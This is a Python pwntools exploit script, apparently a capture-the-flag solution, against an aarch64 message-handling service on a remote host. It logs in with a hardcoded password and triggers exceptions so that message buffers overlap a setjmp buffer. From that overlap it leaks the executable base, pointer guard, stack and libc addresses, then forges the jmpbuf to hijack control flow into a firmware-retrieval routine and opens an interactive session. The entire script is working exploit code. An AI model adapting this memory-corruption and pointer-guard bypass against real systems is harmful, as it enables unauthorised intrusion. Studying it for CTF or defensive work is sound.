from pwn import *

context.update(arch="aarch64")
if args.DEBUG:
    context.update(log_level="debug")

if args.LOCAL:
    s = remote("focal", 1336); local = True
else:
    s = remote("device.quatre-qu.art", 8080); local = False

if not local:
    log.info("Logging in...")
    s.recvuntil(b"password:")
    s.sendline(b"fudmH/MGzgUM7Zx3k6xMuvThTXh+ULf1")
    s.recvuntil(b"b'")
    suffix = s.recvuntil(b"'", drop=True)
    log.info("Solving challenge (suffix=%s)...", suffix)
    prefix = subprocess.check_output([sys.executable, "chalsolve.py", suffix.decode()]).strip()
    s.sendline(prefix)
    log.info("Ready!")

menucount = 0
def menu(opt):
    global menucount
    menucount += 1
    s.send(opt.encode() + b"\n")

def menusync():
    global menucount
    while menucount:
        s.recvuntil(b"Option:")
        menucount -= 1

def sendint(n):
    s.sendline(str(n).encode())

def crc(msg):
    import zlib
    return "{:08x}".format(zlib.crc32(msg) & 0xffffffff)

def bad_msg(content):
    menu("E")
    menu("A")
    sendint(len(content))
    sendint(1)
    menu("n")
    s.sendline(content)
    s.sendline(b"00000000")

# fill msgs
for i in range(10):
    bad_msg(b"a")

# insert extra msg, throw exception on msg size
menu("E")
menu("A")
sendint(999)

# insert one more to overlap jmpbuf, throw exception on hex choice
menu("E")
menu("A")
sendint(256)
sendint(9)
menu("?")

# leak jmpbuf
menu("E")
menu("V")
menu("y")
menusync()
s.recvuntil(b"Message 9: ")
leak = bytes.fromhex(s.recvline().decode())

exe_base = u64(leak[0x18:0x20]) - 0x4060
log.info("exe base: %x", exe_base)
ptr_guard = u64(leak[0x80:0x88]) ^ (exe_base + 0x1f8c)
log.info("ptr guard: %x", ptr_guard)
stack_addr = u64(leak[0x90:0x98]) ^ ptr_guard
log.info("stack addr: %x", stack_addr)
libc_base = u64(leak[0x38:0x40]) - 0x151000
log.info("libc base: %x", libc_base)

# clear messages via password check
menu("B")
menu("A")
menu("R")
s.sendline(b"not-the-passwordnot-the-password")
menusync()

new_jmpbuf = bytearray(leak)
new_jmpbuf[0x80:0x88] = p64(ptr_guard ^ (exe_base + 0x2da8)) # in retr_firmware
new_jmpbuf[0x90:0x98] = p64(ptr_guard ^ (exe_base + 0x159e0))
new_stack = flat([
    0, 0, 0, exe_base + 0x159e0 + 0x30, 0, 0, # handle_exc
    p32(5) + p32(4),
])
new_stack = new_stack.ljust(256)

# fill msgs
for i in range(9):
    bad_msg(b"a")

bad_msg(new_stack)

# insert extra msg, throw exception on msg size
menu("E")
menu("A")
sendint(999)

# insert one more to overlap jmpbuf, throw exception on crc to longjmp
bad_msg(new_jmpbuf)

s.recvuntil(b"Retrieving firmware ...\n")
s.interactive()
